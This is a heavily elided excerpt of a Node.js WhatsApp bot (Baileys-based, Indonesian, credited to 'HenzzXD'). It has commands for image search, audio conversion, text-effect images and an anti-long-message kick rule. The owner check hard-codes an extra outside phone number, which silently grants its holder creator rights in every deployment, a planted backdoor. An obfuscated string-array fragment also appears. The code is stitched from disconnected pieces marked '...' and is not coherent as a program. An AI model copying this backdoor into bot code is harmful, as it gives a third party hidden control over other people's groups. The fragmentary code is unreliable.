...
module.exports = conn = async (conn, m, chatUpdate, store) => {
    try {
        ...
        const isCreator = [botNumber, ...global.owner, '6285711324080@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
    ...
    const _0x547672 =['8SFTvTY','733698bByGMZ','1nqbVzC','11dOuxIL','chat','1838816QQlKFJ','992463nstgLu','4616415lmcnqf','1014PlYMnG','23639900whcpis','5450zYeATk','1020716qbYiGA'];_0x1aa5=function(){return _0x547672;};return _0x1aa5();}
        ...
        if (db.data.chats[m.chat].antivirtex) {
            if (budy.length > 3500) {
                ...
                if (!isBotAdmins) return newReply(`Ehh Bot Gak Admin T_T`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu HenzzXD Ownerku Ternyata 😅`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
...
( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
            ...
            case 'gimage': {
                if (!text) return newReply(`Contoh : ${prefix + command} HenzzXD`)
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
		...
		case 'brainly':{
            ...
            case 'attp':
                try {
                if (args.length == 0) return newReply(`Example: ${prefix + command} HenzzXD`)
            ...
            let media = await conn.downloadMediaMessage(qmsg)
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By HenzzXD .mp3`}, { quoted : m })
	        ...
	        case 'carbon':
	            ...
	            newReply(mess.wait)
	            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/carbon?apikey=${apikey}&code=${q}&language=nodejs`}, caption: `Created By HenzzXD\n\n\nCode:\n\n${q}`}, {quoted: m})
	        break
		...
		case 'freefire':
			...
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${apikey}&text=${args}`}, caption: `Created By HenzzXD\n\n Type: ${command}\n\nText: ${args}`})
			break
    ...
    // Text Prome
        ...
        break
			...
			case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) return newReply(`Contoh : ${prefix + command} 6285711324080`)
...
║  ☍ *ʙᴀɪʀʟᴇʏs:* github:henzz4368/Baileys
...
│◦ ${prefix}memeindo
└
*｢ simple bot whatsapp by HenzzXD ｣*
`
